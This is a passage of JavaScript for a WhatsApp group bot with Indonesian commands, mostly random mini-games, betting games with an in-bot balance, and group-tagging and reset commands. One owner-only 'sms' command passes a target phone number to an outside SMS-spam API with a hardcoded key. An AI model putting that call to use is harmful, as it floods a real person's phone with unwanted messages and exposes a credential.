    const animals = ['elang', 'beruang', 'harimau', 'kijang', 'gajah', 'singa', 'serigala', 'kuda', 'kucing', 'ular'];
    const actions = ['menembak', 'mengejar', 'mengamati', 'menyelinap'];
    const obstacles = ['banjir', 'badai', 'kawanan serigala', 'jalur buntu', 'gunung berapi'];

    async function playRound(player) {
        const animal = animals[Math.floor(Math.random() * animals.length)];
        const action = actions[Math.floor(Math.random() * actions.length)];
        const difficulty = Math.random();
        let points = Math.floor(Math.random() * 21) + 10;

        if (difficulty < 0.2) {
            const obstacle = obstacles[Math.floor(Math.random() * obstacles.length)];
            await m.reply(`Oh tidak! @${player.split('@')[0]}, Anda terperangkap dalam ${obstacle} saat ${action} ${animal}. Upaya Anda terhambat dan Anda hanya mendapatkan setengah poin.`);
            points = Math.floor(points / 2);
        } else if (difficulty < 0.5) {
            await m.reply(`@${player.split('@')[0]}, Anda terjebak dalam semak belukar saat ${action} ${animal}. Upaya Anda terganggu dan Anda mendapatkan sedikit poin.`);
            points = Math.floor(points * 0.75);
        } else {
            await m.reply(`Di hutan yang lebat, @${player.split('@')[0]} sedang ${action} seekor ${animal}! ${action.charAt(0).toUpperCase() + action.slice(1)} dengan tepat dan Anda mendapatkan ${points} poin!`);
        }

        playerScores[player] += points;
    }

    await m.reply(`Selamat datang di permainan Berburu Bersama!\n\nPemain yang berpartisipasi: ${players.map(player => `@${player.split('@')[0]}`).join(', ')}`);

    for (let round = 1; round <= maxRounds; round++) {
        await m.reply(`Ronde ${round} dimulai!`);

        for (let i = 0; i < players.length; i++) {
            await playRound(players[i]);
        }
    }

    let result = 'Permainan Berburu Bersama berakhir!\n\nSkor Akhir:\n';

    players.forEach(player => {
        result += `@${player.split('@')[0]}: ${playerScores[player]} poin\n`;
    });

    const winner = Object.keys(playerScores).reduce((a, b) => playerScores[a] > playerScores[b] ? a : b);
    result += `\nSelamat kepada @${winner.split('@')[0]} yang memenangkan permainan dengan total skor ${playerScores[winner]} poin!`;

    await m.reply(result);
}
break;

case 'balapan': {
    if (!m.mentionedJid || m.mentionedJid.length !== 1) {
        return await m.reply('Tag satu pengguna untuk memulai permainan balapan.')
    }
m.reply('Game Made By Avosky')
    let user = m.mentionedJid[0]
    let userDistance = 0
    let botDistance = 0
    let finishLine = 100 // Jarak garis finish
    let maxRounds = 15 // Jumlah ronde maksimal
    let round = 1
    
    let result = `🏃‍♂️ Mulai permainan balapan dengan @${user.split('@')[0]} 🏃‍♂️\n\n`

    while (round <= maxRounds && userDistance < finishLine && botDistance < finishLine) {
        let userStep = Math.floor(Math.random() * 10) + 1 // Langkah pengguna
        let botStep = Math.floor(Math.random() * 10) + 1 // Langkah bot

        // Rintangan
        if (Math.random() < 0.1) {
            userDistance -= userStep
            result += `🚫 @${user.split('@')[0]} mengalami kecelakaan! Mundur ${userStep} langkah. Jarak: ${userDistance}\n`
        } else {
            userDistance += userStep
            result += `🏁 @${user.split('@')[0]} melangkah ${userStep} langkah. Jarak: ${userDistance}\n`
        }

        if (Math.random() < 0.1) {
            botDistance -= botStep
            result += `🚫 Kamu mengalami kecelakaan! Mundur ${botStep} langkah. Jarak: ${botDistance}\n`
        } else {
            botDistance += botStep
            result += `🏁 Kamu melangkah ${botStep} langkah. Jarak: ${botDistance}\n`
        }

        // Rintangan tambahan
        if (userDistance > 0 && Math.random() < 0.05) {
            userDistance -= 5
            result += `❌ @${user.split('@')[0]} habis bahan bakar! Mundur 5 langkah. Jarak: ${userDistance}\n`
        }

        if (botDistance > 0 && Math.random() < 0.05) {
            botDistance -= 5
            result += `❌ Kamu habis bahan bakar! Mundur 5 langkah. Jarak: ${botDistance}\n`
        }

        result += '\n'
        round++
    }

    result += `\n🏆 Pertandingan selesai!\nJarak akhir: @${user.split('@')[0]} ${userDistance} - Bot ${botDistance}\n`

    if (userDistance > botDistance) {
        result += `\n🎉 @${user.split('@')[0]} memenangkan permainan balapan!`
    } else if (botDistance > userDistance) {
        result += `\n😢 Kamu memenangkan permainan balapan!`
    } else {
        result += `\n⚖️ Pertandingan balapan berakhir imbang!`
    }

    await m.reply(result)
}
break
case 'aduikan': {
    if (!m.mentionedJid || m.mentionedJid.length !== 1) {
        return await m.reply('Tag satu pengguna untuk memulai permainan adu ikan.')
    }
m.reply('Game Made By Avosky')
    let user = m.mentionedJid[0]
    let userScore = 0
    let botScore = 0
    let maxRounds = 15 // Jumlah ronde maksimal
    let round = 1
    
    let result = `🐟 Mulai permainan adu ikan dengan @${user.split('@')[0]} 🐟\n\n`

    while (round <= maxRounds) {
        let userCatch = Math.random() < 0.6 // Kemungkinan pengguna menangkap ikan
        let botCatch = Math.random() < 0.6 // Kemungkinan bot menangkap ikan

        if (userCatch && !botCatch) {
            userScore++
            result += `🎣 @${user.split('@')[0]} berhasil menangkap ikan! (+1 poin)\n`
        } else if (!userCatch && botCatch) {
            botScore++
            result += '🎣 Kamu berhasil menangkap ikan! (+1 poin)\n'
        } else {
            result += '🎣 Ikan lepas\n'
        }

        round++
    }

    result += `\n⏱️ Pertandingan selesai! Total skor: @${user.split('@')[0]} ${userScore} - Kamu ${botScore}`

    if (userScore > botScore) {
        result += `\n🎉 @${user.split('@')[0]} memenangkan permainan adu ikan!`
    } else if (botScore > userScore) {
        result += `\n😢 Kamu memenangkan permainan adu ikan!`
    } else {
        result += `\n⚖️ Pertandingan adu ikan berakhir imbang!`
    }

    await m.reply(result)
}
break
case 'bertarung': {
    if (!m.mentionedJid || m.mentionedJid.length !== 1) {
        return await m.reply('Tag satu pengguna untuk memulai permainan bertarung.')
    }
m.reply('Game Made By Avosky')
    let user = m.mentionedJid[0];
    let userHealth = 200;
    let botHealth = 200;
    let maxRounds = 10; // Jumlah ronde maksimal

    const actions = [
        { name: 'pukulan keras', damage: 15 },
        { name: 'tendangan tinggi', damage: 20 },
        { name: 'serangan combo', damage: 25 },
        { name: 'tendangan berputar', damage: 30 },
        { name: 'pukulan ke perut', damage: 18 },
        { name: 'tendangan ke arah kaki', damage: 23 },
        { name: 'pukulan akrobatik', damage: 28 },
        { name: 'serangan seribu tangan', damage: 35 },
        { name: 'tendangan meteor', damage: 40 },
    ];

    let result = `🥊 Pertarungan dimulai dengan @${user.split('@')[0]}! 🥊\n\n`;

    for (let round = 1; round <= maxRounds; round++) {
        result += `🔥 Ronde ${round}\n\n`;

        let userAttack = actions[Math.floor(Math.random() * actions.length)];
        let botAttack = actions[Math.floor(Math.random() * actions.length)];

        userHealth -= botAttack.damage;
        botHealth -= userAttack.damage;

        result += `⚔️ @${user.split('@')[0]} melancarkan ${userAttack.name} pada Kamu!\n`;
        result += `⚔️ Kamu melancarkan ${botAttack.name} pada @${user.split('@')[0]}!\n`;

        result += `❤️ Kesehatan @${user.split('@')[0]}: ${userHealth} | Kamu: ${botHealth}\n\n`;

        if (userHealth <= 0 || botHealth <= 0) {
            break;
        }
    }

    result += `\n🛌 Pertarungan berakhir!\n`;

    if (userHealth > botHealth) {
        result += `\n🎉 @${user.split('@')[0]} keluar sebagai pemenang pertarungan!`;
    } else if (botHealth > userHealth) {
        result += `\n😢 Kamu berhasil mengalahkan @${user.split('@')[0]} dalam pertarungan yang sengit!`;
    } else {
        result += `\n⚖️ Pertarungan berakhir imbang, kedua pihak pantas mendapatkan penghargaan!`;
    }

    await m.reply(result);
}
break;
case 'adumasak': {
    if (!m.mentionedJid || m.mentionedJid.length !== 1) {
        return await m.reply('Tag satu pengguna untuk memulai permainan adu memasak.')
    }
m.reply('Game Made By Avosky')
    let user = m.mentionedJid[0];
    let userScore = 0;
    let botScore = 0;
    let maxRounds = 5; // Jumlah ronde maksimal

    const ingredients = [
        { name: 'bawang merah', effect: 'menangis', points: -10 },
        { name: 'gula pasir', effect: 'manis', points: 5 },
        { name: 'cabe rawit', effect: 'pedas', points: 15 },
        { name: 'mentega', effect: 'lembut', points: 10 },
        { name: 'keju parmesan', effect: 'gurih', points: 20 },
    ];

    let result = `🍳 Adu memasak dimulai dengan @${user.split('@')[0]}! 🍳\n\n`;

    for (let round = 1; round <= maxRounds; round++) {
        let userIngredient = ingredients[Math.floor(Math.random() * ingredients.length)];
        let botIngredient = ingredients[Math.floor(Math.random() * ingredients.length)];

        result += `🍽️ Ronde ${round}\n\n`;
        result += `👩‍🍳 @${user.split('@')[0]} memasukkan ${userIngredient.name} ke dalam masakannya, efeknya ${userIngredient.effect}!\n`;
        result += `🤖 Kamu memasukkan ${botIngredient.name} ke dalam masakannya, efeknya ${botIngredient.effect}!\n`;

        if (userIngredient.points > botIngredient.points) {
            userScore++;
            result += `🎉 @${user.split('@')[0]} memenangkan ronde ini!\n\n`;
        } else if (botIngredient.points > userIngredient.points) {
            botScore++;
            result += `😢 Kamu memenangkan ronde ini!\n\n`;
        } else {
            result += `⚖️ Ronde ini berakhir imbang!\n\n`;
        }
    }

    result += `\n🍲 Permainan adu memasak berakhir!\n\n`;
    result += `🏆 Skor Akhir: @${user.split('@')[0]} ${userScore} - Kamu ${botScore}\n`;

    if (userScore > botScore) {
        result += `\n🎉 @${user.split('@')[0]} keluar sebagai pemenang adu memasak!`;
    } else if (botScore > userScore) {
        result += `\n😢 Kamu berhasil mengalahkan @${user.split('@')[0]} dalam adu memasak yang unik ini!`;
    } else {
        result += `\n⚖️ Pertandingan berakhir imbang, kedua pihak mendapatkan penghargaan!`;
    }

    await m.reply(result);
}
break;
case 'berantem': {
    if (!m.mentionedJid || m.mentionedJid.length !== 1) {
        return await m.reply('Tag satu pengguna untuk memulai permainan berantem.')
    }
m.reply('Game Made By Avosky')
    let user = m.mentionedJid[0]
    let userHealth = 200
    let botHealth = 200
    let maxRounds = 20 // Jumlah ronde maksimal
    let round = 1

    const actions = [
        'punch', 'kick', 'slap', 'headbutt', 'elbow strike', 'body slam', 'throw',
        'counter attack', 'charge', 'uppercut', 'roundhouse kick', 'flying kick'
    ];

    const outcomes = [
        `terjatuh dan sakit keras!`, `hampir kehilangan keseimbangan!`,
        `tertunduk lemas.`, `memijak kaki sendiri!`, `terjatuh ke belakang!`
    ];
    
    let result = `🥊 Mulai permainan berantem dengan @${user.split('@')[0]} 🥊\n\n`;

    while (round <= maxRounds && userHealth > 0 && botHealth > 0) {
        let userAction = actions[Math.floor(Math.random() * actions.length)];
        let botAction = actions[Math.floor(Math.random() * actions.length)];

        let userDamage = Math.floor(Math.random() * 20) + 1;
        let botDamage = Math.floor(Math.random() * 20) + 1;

        userHealth -= botDamage;
        botHealth -= userDamage;

        let userOutcome = outcomes[Math.floor(Math.random() * outcomes.length)];
        let botOutcome = outcomes[Math.floor(Math.random() * outcomes.length)];

        result += `👊 @${user.split('@')[0]} melakukan ${userAction} dan ${userOutcome}\n`;
        result += `👊 Kamu melakukan ${botAction} dan ${botOutcome}\n`;

        result += `🩸 Kesehatan @${user.split('@')[0]}: ${userHealth} | Kamu: ${botHealth}\n\n`;

        round++;
    }

    result += `\n🛌 Pertandingan berakhir! Kesehatan akhir: @${user.split('@')[0]} ${userHealth} - Kamu ${botHealth}\n`;

    if (userHealth > botHealth) {
        result += `\n🎉 @${user.split('@')[0]} memenangkan pertandingan berantem!`;
    } else if (botHealth > userHealth) {
        result += `\n😢 Kamu memenangkan pertandingan berantem!`;
    } else {
        result += `\n⚖️ Pertandingan berantem berakhir imbang!`;
    }

    await m.reply(result);
}
break;
case 'adulayangan': {
    if (!m.mentionedJid || m.mentionedJid.length !== 1) {
        return await m.reply('Tag satu pengguna untuk memulai permainan adu layangan.')
    }
m.reply('Game Made By Avosky')
    let user = m.mentionedJid[0]
    let userScore = 0
    let botScore = 0
    
    let result = `🪁 Mulai permainan adu layangan dengan @${user.split('@')[0]} 🪁\n\n`

    while (userScore < 5 && botScore < 5) {
        let userRoll = Math.floor(Math.random() * 6) + 1 // Lemparan pengguna
        let botRoll = Math.floor(Math.random() * 6) + 1 // Lemparan bot

        if (userRoll > botRoll) {
            userScore++
            result += `🪁 @${user.split('@')[0]} menang lemparan! (+1 poin)\n`
        } else if (botRoll > userRoll) {
            botScore++
            result += '🪁 Kamu menang lemparan! (+1 poin)\n'
        } else {
            result += '🪁 Lemparan seri!\n'
        }
    }

    if (userScore > botScore) {
        result += `\n🎉 @${user.split('@')[0]} memenangkan permainan adu layangan!`
    } else {
        result += '\n😢 Kamu memenangkan permainan adu layangan!'
    }

    await m.reply(result)
}
break
case 'aduhewan': {
    const args = q.split(' ');
    if (!args[0]) {
        throw `Contoh penggunaan: ${prefix + command} [hewanmu]`;
    }

    const userAnimal = args[0].toLowerCase(); // Hewan pengguna

    const botAnimals = ['anjing', 'harimau', 'gajah', 'singa', 'beruang', 'ular', 'kuda']; // Hewan lawan yang bisa dipilih
    const botAnimal = botAnimals[Math.floor(Math.random() * botAnimals.length)]; // Hewan lawan dipilih secara acak

    let userLives = 20; // Nyawa pengguna
    let botLives = 20; // Nyawa lawan
    let result = `🐾 Pertarungan ${userAnimal} vs ${botAnimal} dimulai! 🐾\n\n`;

    while (userLives > 0 && botLives > 0) {
        let userAttack = Math.floor(Math.random() * 8) + 1; // Serangan pengguna
        let botAttack = Math.floor(Math.random() * 8) + 1; // Serangan lawan

        const userInjured = Math.random() < 0.2; // Peluang hewan pengguna cedera
        const botInjured = Math.random() < 0.2; // Peluang hewan lawan cedera

        if (userInjured) userLives -= 3;
        else userLives -= botAttack;

        if (botInjured) botLives -= 3;
        else botLives -= userAttack;

        if (userInjured) {
            result += `❗ ${userAnimal} mu cedera\n`;
        } else {
            result += `💥 ${userAnimal} mu menyerang ${botAnimal} (-${botAttack} nyawa ${botAnimal})\n`;
        }

        if (botInjured) {
            result += `❗ ${botAnimal} cedera\n`;
        } else {
            result += `💥 ${botAnimal} menyerang ${userAnimal} (-${userAttack} nyawa ${userAnimal})\n`;
        }

        result += '\n';
    }

    if (userLives > botLives) {
        result += `🏆 ${userAnimal} mu menang !!!`;
    } else if (botLives > userLives) {
        result += `🏆 ${botAnimal} menang !!!`;
    } else {
        result += '🏆 Pertandingan seri';
    }

    m.reply(result);
}
break;
case 'aduayam': {
    let userChicken = 5 // Jumlah nyawa ayam pengguna
    let botChicken = 5 // Jumlah nyawa ayam bot
m.reply('Game Made By Avosky')    
    let result = '🐓 Ayam sedang bertarung 🐓\n\n'

    while (userChicken > 0 && botChicken > 0) {
        let userAttack = Math.floor(Math.random() * 3) + 1 // Serangan pengguna
        let botAttack = Math.floor(Math.random() * 3) + 1 // Serangan bot

        userChicken -= botAttack
        botChicken -= userAttack

        if (userChicken <= 0) {
            result += '🐓 Ayam mu terluka\n'
        } else {
            result += `🐓 Ayam mu menendang ayam bot (-${botAttack} nyawa bot)\n`
        }

        if (botChicken <= 0) {
            result += '🐓 Ayam bot terluka\n'
        } else {
            result += `🐓 Ayam bot menendang ayam mu (-${userAttack} nyawa kamu)\n`
        }
        
        result += '\n'
    }

    if (userChicken > botChicken) {
        result += '🐓 Ayam mu menang !!!'
    } else if (botChicken > userChicken) {
        result += '🐓 Ayam bot menang !!!'
    } else {
        result += '🐓 Pertandingan seri'
    }

    m.reply(result)
}
break
case 'qq': {
    if (db.data.users[m.sender].balance <= 100) {
        m.reply("Maaf, balance kamu sudah habis. Main lagi setelah menambahkan balance.");
        break;
    }

    const userChoice = Math.floor(Math.random() * 6);
    const botChoice = Math.floor(Math.random() * 11);
    let result = '';
    
    // Menentukan hasil game
    if (userChoice === botChoice) {
        result = 'Hasil: Seri!';
    } else if (userChoice > botChoice) {
        result = `Hasil: Kamu menang! (Kamu ${userChoice} vs Bot ${botChoice})`;

        // Peluang menang jackpot 60%
        const winChance = Math.random();
        if (winChance <= 0.6) {
            const jackpot = 30000;
            db.data.users[m.sender].balance += jackpot; // Menambahkan jackpot ke balance pengguna
            result += `\nKamu memenangkan jackpot sebesar ${jackpot} balance!`;
        }
    } else {
        result = `Hasil: Bot menang! (Kamu ${userChoice} vs Bot ${botChoice})`;
        
        // Peluang kalah dan pengurangan balance
        const loseChance = Math.random();
        if (loseChance <= 0.6) {
            const loss = 3000;
            db.data.users[m.sender].balance -= loss; // Mengurangkan balance pengguna
            result += `\nKamu kehilangan ${loss} balance.`;
        }
    }

    m.reply(result);
}
break;
case 'adventure':
    const locations = ['hutan', 'laut', 'gurun'];
    const adventurerState = {
        location: 'hutan',
        supplies: 100,
        experience: 0
    };

    const actions = [
        '🏹 Berburu hewan liar', '🚰 Mencari sumber air', '🏕️ Mendirikan perkemahan', 
        '🚶 Berjalan menyusuri pantai', '🕳️ Mengeksplorasi gua', '👫 Bertemu penduduk lokal'
    ];

    const enemies = [
        { name: 'serigala', damage: 20 },
        { name: 'harimau', damage: 25 },
        { name: 'hantu', damage: 30 },
        { name: 'monster laut', damage: 35 }
    ];

    const weapons = [
        { name: 'senjata tajam', damage: 15 },
        { name: 'bom', damage: 50 },
        { name: 'roket', damage: 70 }
    ];

    async function adventureRound() {
        const location = adventurerState.location;
        const randomActionCount = Math.floor(Math.random() * actions.length) + 1;
        const selectedActions = [];
        for (let i = 0; i < randomActionCount; i++) {
            const randomActionIndex = Math.floor(Math.random() * actions.length);
            selectedActions.push(actions[randomActionIndex]);
            actions.splice(randomActionIndex, 1);
        }

        await m.reply(`Anda memilih aksi-aksi berikut untuk putaran ini:\n${selectedActions.join('\n')}`);
        
        for (const action of selectedActions) {
            if (action.includes('🏹')) {
                const huntedFood = Math.floor(Math.random() * 20) + 10;
                adventurerState.supplies += huntedFood;
                await m.reply(`Anda berhasil ${action} dan mendapatkan ${huntedFood} makanan.`);
            } else {
                const experienceEarned = Math.floor(Math.random() * 30) + 10;
                adventurerState.experience += experienceEarned;

                const difficulty = Math.random();
                if (difficulty < 0.15) {
                    adventurerState.supplies -= 20;
                    await m.reply(`Anda menghadapi kesulitan saat ${action} di ${location} dan kehilangan makanan. Pengalaman Anda: ${experienceEarned} poin.`);
                } else if (difficulty < 0.35) {
                    adventurerState.supplies -= 10;
                    await m.reply(`Anda menemukan jalan yang sulit saat ${action} di ${location} dan makanan sedikit berkurang. Pengalaman Anda: ${experienceEarned} poin.`);
                } else {
                    const randomEnemy = enemies[Math.floor(Math.random() * enemies.length)];
                    const enemyDamage = randomEnemy.damage;
                    adventurerState.supplies -= enemyDamage;
                    await m.reply(`Anda berhadapan dengan ${randomEnemy.name} saat ${action} di ${location}! Pengalaman Anda: ${experienceEarned} poin. ${randomEnemy.name} menyebabkan ${enemyDamage} kerusakan pada persediaan makanan Anda.`);
                }
            }
        }
    }

    async function encounterEnemy() {
        const randomEnemy = enemies[Math.floor(Math.random() * enemies.length)];
        const randomWeapon = weapons[Math.floor(Math.random() * weapons.length)];
        const enemyDamage = randomEnemy.damage;
        const weaponDamage = randomWeapon.damage;

        await m.reply(`Tiba-tiba, Anda diserang oleh ${randomEnemy.name} bersenjata ${randomWeapon.name}! Anda terluka dan kehilangan ${enemyDamage} poin makanan. Anda juga berhasil melawan dan menghasilkan ${weaponDamage} kerusakan pada lawan.`);
        adventurerState.supplies -= enemyDamage;
    }

    adventurerState.location = locations[Math.floor(Math.random() * locations.length)]; // Pilih lokasi baru
    await m.reply(`Selamat datang dalam petualangan!\nLokasi: ${adventurerState.location}`);

    for (let round = 1; round <= 3; round++) {
        await m.reply(`Putaran Selanjutnya dimulai!`);
        adventurerState.location = locations[Math.floor(Math.random() * locations.length)]; // Pilih lokasi baru
        await m.reply(`Lokasi saat ini: ${adventurerState.location}`);

        if (Math.random() < 0.2) {
            await encounterEnemy();
        } else {
            await adventureRound();
        }
    }

    const result = 'Petualangan selesai!\n\nHasil Putaran Terakhir:\n' +
        `Lokasi Terakhir: ${adventurerState.location}\nMakanan Tersisa: ${adventurerState.supplies} kg\nPengalaman: ${adventurerState.experience} poin`;

    await m.reply(result);
    break;
            case 'tagall': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
                for (let mem of participants) {
                teks += `⭔ @${mem.id.split('@')[0]}\n`
                }
                sky.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break      
case 'hidetag': { 
        if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin         
          sky.sendMessage(
            m.chat,
            { text: q ? q : "", mentions: participants.map((a) => a.id) },
            { quoted: fkontak }
          );
        }
        break
case 'sms':{
		if (!text) throw `Example : ${prefix + command} 628387064****`
		if (!isCreator) throw mess.owner
			m.reply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/sms/spam2?apikey=Gata_Dios&nomor=${q}`)
			m.reply(data.result)
			}
			break
case 'bingo': {
    // Fungsi untuk mengacak array
    function shuffle(array) {
        const shuffled = array.slice();
        for (let i = shuffled.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
        }
        return shuffled;
    }
    const options = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h']; // Pilihan a-z sesuai dengan kolom Bingo
    const userChoice = args[0] ? args[0].toLowerCase() : null; // Pilihan pengguna
    const betAmount = parseInt(args[1]); // Jumlah taruhan yang diinginkan

    // Memastikan pilihan pengguna adalah yang valid
    if (!userChoice || !options.includes(userChoice)) {
        m.reply('Contoh Bingo a-h taruhan');
        return;
    }

    // Memeriksa apakah taruhan yang diinginkan valid
    if (isNaN(betAmount) || betAmount <= 0) {
        m.reply('Tentukan jumlah taruhan yang valid dan lebih dari 0.');
        return;
    }

    const userBalance = db.data.users[m.sender].balance; // Saldo pengguna

    // Memeriksa apakah saldo pengguna mencukupi untuk taruhan
    if (userBalance < betAmount) {
        m.reply('Maaf, saldo Anda tidak mencukupi untuk taruhan ini.');
        return;
    }

    // Mengacak item yang harus dicari dalam petualangan
    const itemsToFind = shuffle([
        'Potion of Healing',
        'Enchanted Sword',
        'Treasure Map',
        'Dragon Scale',
        'Magic Wand',
        'Ancient Relic',
        'Invisibility Cloak',
        'Elixir of Wisdom',
        'Golden Key',
        'Crystal Ball',
        // Tambahkan item lain sesuai kebutuhan
    ]);

    // Mengambil item yang harus ditemukan sesuai dengan pilihan pengguna
    const chosenItem = itemsToFind[options.indexOf(userChoice)];

    // Memeriksa apakah pengguna menemukan item yang benar
    if (Math.random() < 0.5) { // Menggunakan 50% peluang
        m.reply(`Selamat! Kamu berhasil menemukan ${chosenItem} dan memenangkan ${betAmount} balance.`);
        db.data.users[m.sender].balance += betAmount;
    } else {
        m.reply(`Maaf, pilihan Anda (${userChoice}) belum menemukan item yang harus dicari. Coba lagi nanti!`);
        db.data.users[m.sender].balance -= betAmount;
    }
    }
    break
    case 'cvlimit': {
    const convertAmount = parseInt(args[0]);
    if (isNaN(convertAmount) || convertAmount <= 0) {
        m.reply('Masukkan jumlah yang valid untuk diubah dari limit ke balance.');
        return;
    }
    const userLimit = db.data.users[m.sender].limit;
    const balanceToAdd = convertAmount * 100;
    if (userLimit < convertAmount) {
        m.reply('Maaf, limit Anda tidak mencukupi untuk melakukan konversi sebesar ini.');
        return;
    }
    db.data.users[m.sender].balance += balanceToAdd;
    db.data.users[m.sender].limit -= convertAmount; 
    m.reply(`Anda telah berhasil mengonversi ${convertAmount} limit menjadi ${balanceToAdd} balance.`);
    break;
}					          
			case 'toptv': {
 try {
 if (m.message.extendedTextMessage) {
 // Mengambil pesan yang dikutip
 const quotedMessage = m.message.extendedTextMessage.contextInfo.quotedMessage;

 // Memeriksa apakah pesan yang dikutip adalah video atau gambar dengan format .webp
 if (quotedMessage.videoMessage || quotedMessage.imageMessage) {
 let mediaMessage;
 let extension;

 // Menentukan tipe media yang dikutip dan menetapkan extensi file
 if (quotedMessage.videoMessage) {
 mediaMessage = quotedMessage.videoMessage;
 extension = 'video';
 } else if (quotedMessage.imageMessage.mimetype === 'image/webp') {
 mediaMessage = quotedMessage.imageMessage;
 extension = 'webp';
 } else {
 throw new Error('Hanya mendukung video atau gambar dengan format .webp.');
 }

 // Memproses pesan menjadi ptv format
 var dataMessage = { ptvMessage: mediaMessage };
 sky.relayMessage(m.chat, dataMessage, {});
 } else {
 throw new Error('Tidak ada pesan video atau gambar dengan format .webp yang dikutip.');
 }
 }
 } catch (error) {
 m.reply(`Error: ${error.message}`);
 }
}
break
					
						case 'resetbalance': {
    const newBalance = 1000; // Saldo baru yang akan diatur untuk semua pengguna
    // Mengatur ulang saldo seluruh pengguna menjadi 1000
    for (const user in db.data.users) {
        db.data.users[user].balance = newBalance;
    }
    m.reply(`Saldo seluruh pengguna telah direset menjadi ${newBalance} balance.`);
    break;
}
			case 'resetlimit': {
    const newBalance = 20; // Saldo baru yang akan diatur untuk semua pengguna
    // Mengatur ulang saldo seluruh pengguna menjadi 1000
    for (const user in db.data.users) {
        db.data.users[user].limit = newBalance;
    }
    m.reply(`limit seluruh pengguna telah direset menjadi ${newBalance} limit.`);
    break;
}
case 'ipinfo2': {
  if (!isPrem) return replyprem(mess.premium)
		if (!text) throw `Input *[IP]*`
			m.reply(mess.wait)
			var { data } = await axios.get(`https://ipapi.co/${text}/json/`)
			m.reply(`HASIL\nIP : ${data.ip}\nNETWORK : ${data.network}\nVERSION : ${data.version}\nCITY : ${data.city}\nREGION : ${data.region}\nREGION CODE : ${data.region_code}\nCOUNTRY : ${data.country}\nCOUNTRY NAME : ${data.country_name}\nCOUNTRY CODE : ${data.country_code_iso3}\nCOUNTRY KAPITAL : ${data.country_capital}\nCOUNTRY TLD : ${data.country_tld}\nCONTINENT CODE : ${data.continent_code}\nIN EU : ${data.in_eu}\nLATITUDE : ${data.latitude}\nLONGITUDE : ${data.longitude}\nTIMEZONE : ${data.timezone}\nUTC OFFSET : ${data.utc_offset}\nCOUNTRY CALL ID : ${data.country_calling_code}\nCURRENCY : ${data.currency}\nCURRENCY NAME : ${data.currency_name}\nLANGUAGE : ${data.languages}\nCOUNTRY AREA : ${data.country_area}\nCOUNTRY POPULATION : ${data.country_population}\nASN : ${data.asn}\nORG : ${data.org}`.trim())
			}
			break

case 'tag2': {
 if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
 if (!m.isGroup) throw mess.group;
 if (!isBotAdmins) throw mess.botAdmin;
 if (!isAdmins) throw mess.admin;

 // Memeriksa format argumen
 const parts = q.split(',');
 if (parts.length !== 2) return m.reply('Format perintah salah. Gunakan @user,jumlah');

 const userTag = parts[0].trim();
 const jumlah = parseInt(parts[1].trim());

 if (!userTag.startsWith('@')) return m.reply('Tag pengguna harus dimulai dengan @');
 if (isNaN(jumlah) || jumlah <= 0) return m.reply('Jumlah yang ditentukan harus lebih dari 0 dan merupakan angka.');

 const taggedUser = userTag.replace('@', '');
 
 // Mengambil peserta grup yang sesuai dengan tag
 const matchedParticipants = participants.filter(mem => mem.id.split('@')[0] === taggedUser);

 if (matchedParticipants.length === 0) return m.reply('Tidak ada anggota yang sesuai dengan tag yang diberikan.');

 // Batasi jumlah peserta yang ditandai sesuai input
 const participantsToTag = [];
 for (let i = 0; i < jumlah; i++) {
 participantsToTag.push(matchedParticipants[i % matchedParticipants.length]);
 }

 let teks = `══✪〘 *👥 Tag ${jumlah} Anggota* 〙✪══\n\n`;
 for (let mem of participantsToTag) {
 teks += `⭔ @${mem.id.split('@')[0]}\n`;
 }

 sky.sendMessage(m.chat, { text: teks, mentions: participantsToTag.map(a => a.id) }, { quoted: m });
}
break;

case 'randomtag': {
  if (!isGroup) throw mess.onlygroup;
  if (!args[0]) throw `Gunakan: *${prefix}randmtag [jumlah tag]*`;
  const jumlahTag = parseInt(args[0]);
  if (isNaN(jumlahTag) || jumlahTag <= 0) throw 'Jumlah tag harus berupa angka positif.';
  const participants = await sky.groupMetadata(from);
  const participantList = participants.participants;
  const randomIndexes = [];
  while (randomIndexes.length < Math.min(jumlahTag, participantList.length)) {
    const randomIndex = Math.floor(Math.random() * participantList.length);
    if (!randomIndexes.includes(randomIndex)) {
      randomIndexes.push(randomIndex);
    }
  }
  const taggedMembers = randomIndexes.map(index => {
    const participant = participantList[index];
    return `> @${participant.id.split('@')[0]}\n`;
  });
  const tagMessage = taggedMembers.join(' ');

  await sky.sendTextWithMentions(from, tagMessage);
  break;
}
case 'poker': {
 const args = m.text.split(' ');
 if (args.length !== 2) {
 m.reply('Format yang benar: !poker [jumlah taruhan]');
 return;
 }

 const taruhan = parseInt(args[1]);

 if (isNaN(taruhan) || taruhan <= 0) {
 m.reply('Masukkan jumlah taruhan yang valid.');
 return;
 }

 // Periksa apakah pengguna memiliki balance yang cukup
 const userBalance = db.data.users[m.sender].balance || 0;
 if (userBalance < taruhan) {
 m.reply('Maaf, balance kamu tidak mencukupi untuk taruhan ini.');
 return;
 }

 const suits = ['Spades', 'Hearts', 'Diamonds', 'Clubs'];
 const ranks = ['2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K', 'A'];
 const deck = [];
 for (const suit of suits) {
 for (const rank of ranks) {
 deck.push(`${rank} of ${suit}`);
 }
 }

 // Acak deck kartu dengan lebih baik
 const shuffledDeck = [];
 while (deck.length > 0) {
 const randomIndex = Math.floor(Math.random() * deck.length);
 shuffledDeck.push(deck.splice(randomIndex, 1)[0]);
 }

 const players = ['Pemain', 'Bot 1', 'Bot 2', 'Bot 3'];
 const hands = {};
 for (const player of players) {
 hands[player] = [shuffledDeck.pop(), shuffledDeck.pop()];
 }

 // Logika permainan yang memungkinkan semua tiga opsi
 const pemainMenang = Math.floor(Math.random() * 3); // Acak antara 0, 1, atau 2 untuk menentukan pemenang

